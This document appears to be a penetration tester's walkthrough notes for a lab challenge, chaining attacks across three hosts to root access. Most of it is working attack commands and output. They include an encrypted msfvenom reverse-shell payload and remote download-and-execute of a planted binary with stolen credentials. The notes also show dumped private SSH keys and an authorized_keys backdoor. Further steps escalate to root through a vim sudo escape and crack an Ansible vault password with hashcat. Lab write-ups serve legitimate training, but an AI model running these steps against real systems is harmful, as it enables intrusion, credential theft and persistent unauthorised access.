With the directory enumeration upload.html was identified.

Generate a payload using msfvenom

```
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f elf --encrypt xor --encrypt-key 'CHANGEMYKEY' prependfork=true -t 300  -o test.elf
```

Identify the users files

```
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  18    fil   2019-11-08 11:21:40 -0500  .bash_logout
100644/rw-r--r--  141   fil   2019-11-08 11:21:40 -0500  .bash_profile
100644/rw-r--r--  312   fil   2019-11-08 11:21:40 -0500  .bashrc
100644/rw-r--r--  33    fil   2025-03-12 17:44:12 -0400  local.txt
100644/rw-r--r--  23    fil   2020-08-20 11:34:43 -0400  repo.txt

meterpreter > cat repo.txt
walleyedev
photofinish
meterpreter >

```

Navigate to 192.168.151.173 

log in will the creds found in repo.txt

![[Pasted image 20250312163001.png]]

Navigate to the url path to identify 

![[Pasted image 20250312163027.png]]

reading the jfrog documentation in the site you and upload files with this command

```
curl -u walleyedev:photofinish -T /home/kali/osep/challenge_3/test3.elf "http://192.168.151.173:8081/artifactory/generic-local/test3.elf"
```

once its open start your meterpreter shell again and select fix checksums and you will get a shell with nottodd on 192.168.151.172

![[Pasted image 20250312164605.png]]

Identify nottodd .ssh folder and watch the folder

```
TERM=xterm watch -n 1 'ls -la'`
```

```
watch -n 1 ls -la
```
you will see marks ssh session pop up and quickly use it to log into cb3

```
ssh marks@cb3
```

```
marks@cb3:22
ssh marks@cb3
Pseudo-terminal will not be allocated because stdin is not a terminal.
ls
local.txt
monitor.sh
whoami
marks

```

use cat can head to get all of the key

```
head -n 20 id_rsa
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAtxgEN1yDX3TBhEo/TR01L40/cb+sa4qF8uUh9gHkW6fjhw78
B4reekNmwUd/8vKvlkSzBYf2zhWsG1u1X9JzVaeXz27O3p1A+Jin0jQ7+seXj68d
d7/LN+AJgkwFGIc5FK+b8gCDlBssIBt4e4/Sn0PyABrOUlblSpyVwoPBsyIFF+qn
2wSkpSqrSrZvi3zAajPWpWEnyyXB1Zr89V5whZYZLldfQgSu72T75nGRqRJUsuH4
frr0zkEk3QHPGGlENnZReTeJcPOsI6Rv95PRJPCj/1MqErcU24qNIXVM8UX5k7i5
tXXNr/GzvmqaqAY3S+gRGdQfEarDGVhtDTqTdQIDAQABAoIBAF9OTxOKQpAztG/q
Ph0j8QV5nubVASlRh/wxrYXi4j2bnOI2uJYsgTZfU2OUllOeZCvyQsXESoJn4Zi0
Gitw3rxdarZ9VY2niaRdwi23JumZb5lJbCtjWKMTKZ/7dkOYT+wmpSRJhDRaGJP1
+LdI3DgvJA9N5MwTk3NNIt+HuhJF5spXtWOhaFXovwYPkaCjHfMnXRwpaXeyzi7W
UhbODKZR/HXJ4YMpKndAnq0aqDPvefBiWQjg0fLdAThFTER3b6nzbzoS1pXnyOD+
O4yzMk18FH5I8AXccYL6yvwanMRsfegdDhXsFhL2u3DfhCABjnc29I/PgDZ7oWiW
cgqL65kCgYEA7W+K/6opWbGsnrz3ScDj7J/3l1wv7ZHCAChQxkUoVcjGIXtnTFfB
LhznmSHwai4mXnjhM508XMgPEvnP99z6OZeo0HG4xWVmcUEKNOADBi1nVfS2mPKw
ZW7aJb7aTspgGQ1m6co+dU0y2cNuZFbTtXLGDH7B9VxPYinCNo87IQMCgYEAxWjH
ZdQF5vRigF5FNLVTCIr283OWX1ykgQ2QzoGA/GcQZKmR5poogXbmVz4+U5nIF6qj
wDBhWeBaHKdtTOaMQxY/Rk4BL0pQf+72DHvRGMQRv07Qgk5DiM/gwvH/6x0HJf6X
KjuOLzl7KPz1inkyhMi3yhyjjNMetxFqwi8RhCcCgYAm43QSt94Z8L3jKfQewlcS
dIjq45B+CreJqxC/yKf4lO/OoBWlLWJYmSddr29fFLv4EThhaclvMN03MG9dm3Xo
ZOyjZ1zqB9eliQ+Q5XfZVSptq60Uk/tMQcG9GOtMqFzg/Y7zj8p3D/PaMuYrzQTT
3T6O4VwHQd1GqKxEn2UB3QKBgQDDVwVIe99DRDxcLexpVavOXkQzbwMzZebaVOQf
lAJgwFN2aF0ZRR4jzdXsKoleDGP1F0NmH/mVB+3jQMFlQRU2JUODfBisBOtXTMxo
WfT0fr/ZAFJPPsaRELKl9PV6X4T9UcmfXsM5c7WtP3JxDbCxuDQ1aNVlultAZ5mu
gQjiLQKBgAdBHZQgLMVA5wxnv9jTjhtHDsPJko8IU24f0EViPj42AnMVymOD4W9b
n2yxyk/xHzViKSvJfW7Fo0kGGLmUAoybdzyh0XjUWZ1VdHVxfLblVx260b+Sux4Q
JxhAGKwFd7xYeb19HgeaI1zFVzD4kAwZBsM8Hoz7XSx0b+rsV6C2
-----END RSA PRIVATE KEY-----
```

looking in nottodd/.ssh authorized keys we see that mark can ssh into it

```
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100600/rw-------  391   fil   2020-08-20 13:40:48 -0400  authorized_keys
100644/rw-r--r--  103   fil   2020-08-20 15:05:07 -0400  config
040775/rwxrwxr-x  4096  dir   2025-03-13 14:20:01 -0400  controlmaster
100600/rw-------  2602  fil   2020-08-20 13:37:35 -0400  id_rsa
100644/rw-r--r--  566   fil   2020-08-20 13:37:35 -0400  id_rsa.pub
100644/rw-r--r--  666   fil   2025-03-13 13:25:02 -0400  known_hosts

meterpreter > cat known_hosts
|1|QvZrrIQRYcL1Hyj4acU23Tj2MbY=|xOPfwc4/jJLvH7hfv++KxCJsIs4= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPgwkO9AOPY3a4Ssk8fdjw/q5KInEZ+Yf+t9NY7ztxemcjc3ri1aCEbgFIlrkQgq28Tu6XTYpmjsbG1n7esnxhQ=
|1|fgt7WX1oPsKUDDY1axYtmL/g+kM=|DbTb9CtZgEqJWQW613YhXL9RP2s= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPgwkO9AOPY3a4Ssk8fdjw/q5KInEZ+Yf+t9NY7ztxemcjc3ri1aCEbgFIlrkQgq28Tu6XTYpmjsbG1n7esnxhQ=
|1|nMgr8d4gfzjm2IVINXc5J+RCxhY=|0gv0xxRKaM1cxMGLd9kWZQ7ADdI= ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPgwkO9AOPY3a4Ssk8fdjw/q5KInEZ+Yf+t9NY7ztxemcjc3ri1aCEbgFIlrkQgq28Tu6XTYpmjsbG1n7esnxhQ=
meterpreter > cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3GAQ3XINfdMGESj9NHTUvjT9xv6xrioXy5SH2AeRbp+OHDvwHit56Q2bBR3/y8q+WRLMFh/bOFawbW7Vf0nNVp5fPbs7enUD4mKfSNDv6x5ePrx13v8s34AmCTAUYhzkUr5vyAIOUGywgG3h7j9KfQ/IAGs5SVuVKnJXCg8GzIgUX6qfbBKSlKqtKtm+LfMBqM9alYSfLJcHVmvz1XnCFlhkuV19CBK7vZPvmcZGpElSy4fh+uvTOQSTdAc8YaUQ2dlF5N4lw86wjpG/3k9Ek8KP/UyoStxTbio0hdUzxRfmTuLm1dc2v8bO+apqoBjdL6BEZ1B8RqsMZWG0NOpN1 marks@cb3

```

using Marks keys under Todd we can access cb2

```
 ssh -i id_rsa todd@192.168.193.172
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 13 Mar 2025 06:31:15 PM UTC

```

sudo -l
```
todd@cb2:/home/nottodd$ sudo -l
Matching Defaults entries for todd on cb2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User todd may run the following commands on cb2:
    (root) NOPASSWD: /usr/bin/vim /opt/tpsreports.txt

```

we can use meterpreter to upload files to /tmp

```
sudo /usr/bin/vim /opt/tpsreports.txt
```

then in vim execute this
```
:!/bin/sh
# whoami
root
#
```

going back to .173 as mark I wanted to further enumerate

I identified this file in /opt/ansible

```
drwxr-xr-x 5 root       root       4096 Aug 31  2020 ..
-rw-r--r-- 1 ansibleadm ansibleadm  745 Aug 20  2020 webserver.yaml
cat webserver.yml
cat: webserver.yml: No such file or directory
cat webserver.yaml
- name: Get system info
  hosts: all
  gather_facts: true
  become_user: root
  vars:
    ansible_become_pass: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          66643733653335656662343832633439353565343839386538643763643531343065366661633634
          6262313438663539373565646533383430326130313532380a316132313636383633386532333765
          37323838343038393738313831636163643638623162323630656434346433346664613233393036
          6638663531343866380a313634353331333331623565303833323663623265616131633934623134
          62656439343264376638643033633037666534656631333963333638326131653764


  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"

```

with ansible2john ensure you remove the prefix

```
ansible2john test1.txt > cred1.hash
```

remove the test.txt

```
test.txt:$ansible$0*0*fd73e35efb482c4955e4898e8d7cd5140e6fac64bb148f5975ede38402a01528*164531331b5e08326cb2eaa1c94b14bed942d7f8d03c07fe4ef139c3682a1e7d*1a21668638e237e7288408978181cacd68b1b260ed44d34fda23906f8f5148f8
```

 hashcat
```
hashcat -m 16900 -O -a 0 -w 4 cred_fixed.hash /usr/share/wordlists/rockyou.txt
```

```
$ansible$0*0*fd73e35efb482c4955e4898e8d7cd5140e6fac64bb148f5975ede38402a01528*164531331b5e08326cb2eaa1c94b14bed942d7f8d03c07fe4ef139c3682a1e7d*1a21668638e237e7288408978181cacd68b1b260ed44d34fda23906f8f5148f8:bowwow
```

back on 172 as nottodd
```
wget --user todd --password whyaretheresomanyants http://cb3:8082/artifactory/generic-local/tpsreports.elf >> /home/nottodd/update_log.txt
chmod +x /home/nottodd/tpsreports.elf >> /home/nottodd/update_log.txt
/home/nottodd/tpsreports.elf
```

we can transfer files this way as well
```
wget --user todd --password whyaretheresomanyants http://cb3:8082/artifactory/generic-local/pspy >> /home/marks/pspy
```

I generate ssh keys as mark

```
ssh-keygen -t rsa -b 4096 -C "173"
```

Echo the public key
```
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBmnDH8ARUm4RASnV7RHpgmVe44rxMBZsTHKYYJG1dMtgSv9/y5momy5OMF2VmU5SfJOMUs82HR5f1d51p6YuTOe66YIXzdlwtqcu70fvpSPmAD038vyV5GN2h+qk7hbE+lB5ZxfA+qBZ7mDFZ/t2wdqfy6abrRAjrGdC+ALTdXYyH/QPYJ5w8LfpGSb5s/1QXROnMHN77B5Jycm5gYY9h0tvBSdnh4z1YHpWe75PiEHXdYEUZ88S07k0MMHTPHKBbesXrc3/d/NYHwBLwgpjvRQ2fvfvmWqpfLBe8SzuiyQzeNBRA/Ys0Bn3lUStpVxa1A6KXdL0oR1V3tEsAl7i3qZXbtYFskm8+dcQsoiN8Yaholz5CIs0mGxti4fTjdIEjGPF5wzUS6kpM31byhz3d9Ad9XVkZIwucOX4FigRMoZoHXNL6MdQFk4BYQOnD3q2IxIFtEy/AyzZlhT0WCL4fKlrrx2N2b0ptyjCy/0fSmBUhjEWXXClF5NPlXPYK545rcMC0EH4ozlmwgfpivxiaGR9gipFFWnfdosvIfxsuKWUhK8b1riGXdi+ujiCblxEbTRMtL1WQ6MZYp2H96KFjIK/zxHIO+tqmGsNobmOnHArDxCfzqIUkp0OoC/hLgoj0RPn/tpY4bkSASjnjFjZiWTg2alsSDfdetUtImrsWYQ== 173" >> ~/.ssh/authorized_keys

```

```
ssh -i id_rsa1 marks@192.168.193.173
```

on 173 run pspy

```
2025/03/13 17:10:02 CMD: UID=1002  PID=20132  | bash -i -c source /home/marks/.bashrc; echo "nothingwaschangedargh" | sudo -S netstat -ap > /tmp/mark_listening.txt

```

run this for root

```
sudo -S su root
```

password
```
nothingwaschangedargh
```

Go into the ansibleadm page and copy their id_rsa key

```
root@cb3:/home/ansibleadm/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzBbANra0tpyAjEPYuf8MLg1Z8h63QrzJp82vOSgbwCXSCPII
Cwj6V5EoeO02CukmfQOJ06xnLIrTqw10x/G/D5PIfvUuz2mmpKMHRRGyVJTaXnw3
73Gk+RskDRJXQSQSg/o5EbuCtmt12tLiKh6GGytaqziSSFmPGhH3fy7qJIbWmjgQ
f6djNL95impxkYZhgzAfRzgyLxEbi6iQ85aTL2b49nbp3U/7dizwN/NEX2wkE/e/
omVsaX43fwfUrxmtQXZvQX4V1NitZxSO00k4eRzNT/JxdWQzZFvAzxzYpoMATfiD
tTYeEEhtTavvxOgwpxRMaYkr4A5o5c8frzbG6wIDAQABAoIBABg6Sy8zmVhkU85S
75OE94kwBJF9m/vMNZQ6EqcSX9j7pGdzdAj7U9y5WrigUF4TN4J3vRDn0oezI1WX
D1n9FNVgkdigeqIcxK+euuo0I5tu4E1/KZS/RPpdgnYay0jsY1ZPih7Ux7uoHiGQ
D1E4tmrbRrQ0zwjPuPE7WMo8Y4daU9sbWoE4gyfsg5JCTnvbnxJb4cC7hF4+tLuR
YtLZfsHT0IiJqNoDVYuA4shVNZ0MylUg8qk9BasEzcWNkw4a6Vx3laHplnrShlf6
eaOG3p5noN4vqrOlT+QOarFKr6kIYVlxH1BBPk2x5K1wpfw35OGt/TW1OaOr6skz
WZMX0CECgYEA/6/Ot6ztIVMakPza3ZXT4R0ZMzj3LKuj3TXcmeeOH/PB3JUeq6sS
6cVWcv4hKgM9Xu27TTGCVG5P65LXizyXpnb787DsdxNcpd6rhRcrlg1JqsAbZpu9
R1zOk614JergIzWq1j/7WokBLg8Sy/dvsDa+XMdJxVkIKsI5DSo4mq0CgYEAzFbC
qeHDuLgx47kyXfKtiQVAgpu0BVLjvBauZ0+LGHATl/WbliD9guv8lWdcgK+M5f24
kjiQePvB8ptlTz/FCdawHUaf0ngB+tCkehJxArmJtxnCewM+TLmOiJ3YycaPLIh+
WhjyKECXlqlt/NCRV3QO5edmP+7z3eNqz1Aq8vcCgYBFFBB7W0Ltn/Arf8T53MLT
rPLj/d35uZ2Z5DVnd0HUrBySJc+VfbCsa95BTxtSqHFqNjxGTLvzZ6I7+P425fXq
yXakjgY03YxIW/JnEK176rceZKyCek0W/KHrEBDH3b8UhClVnQ+hlCY3dWcUqBMK
vp+LnWP252jndHXJcsC8OQKBgQCehWg7FpQaB3tcqN20GIIb3GExcc10m9tknUvr
hb/o03m/16A+FZXWLXEkDq2qf4YVHoJDnXInCVhq97behiA8A7tY2uM+Ci+u/pG6
yfe2H24BCBDiEaARMZqrzZjS4CFOcQ1kpBmotINlNEfJa5x1deng3WVrj9rMdpL0
BcNr/QKBgDeZ8KAUdgc/CL6Wvxc8FvARpZfWj63ATF9iQjOFr0vv4gTopckKR7j/
ymILTdWsx3+1CpwO4YBr/5pUoNS07GO26+evMlkRz4KGPH4YMSHWxYi9OWX5OCCl
13jM38D7S34qSOeuo/E8uzZFArbGvogxoUf9rMyadJCsGA0YIps6
-----END RSA PRIVATE KEY-----
```

Now back to 171

we have the ansible password: `bowwow`

```
 ssh -i id_rsa ansibleadm@192.168.193.171
Activate the web console with: systemctl enable --now cockpit.socket

Last failed login: Thu Mar 13 17:56:41 EDT 2025 from 192.168.45.235 on ssh:notty
There were 3 failed login attempts since the last successful login.
Last login: Thu Aug 20 10:22:32 2020 from 192.168.120.173
[ansibleadm@localhost ~]$
```

I could not find anything here, so I moved back to 173 and discovered that i needed to decrypt the playbook, ensure there are no line breaks in the format

```
root@cb3:/opt/ansible# cat pw.txt
$ANSIBLE_VAULT;1.1;AES256
66643733653335656662343832633439353565343839386538643763643531343065366661633634
6262313438663539373565646533383430326130313532380a316132313636383633386532333765
37323838343038393738313831636163643638623162323630656434346433346664613233393036
6638663531343866380a313634353331333331623565303833323663623265616131633934623134
62656439343264376638643033633037666534656631333963333638326131653764
```

```
root@cb3:/opt/ansible# cat pw.txt | ansible-vault decrypt
Vault password:
lifeintheantfarm
Decryption successful
```

now back on 171
```
[ansibleadm@localhost home]$ su root
Password:
[root@localhost home]#
```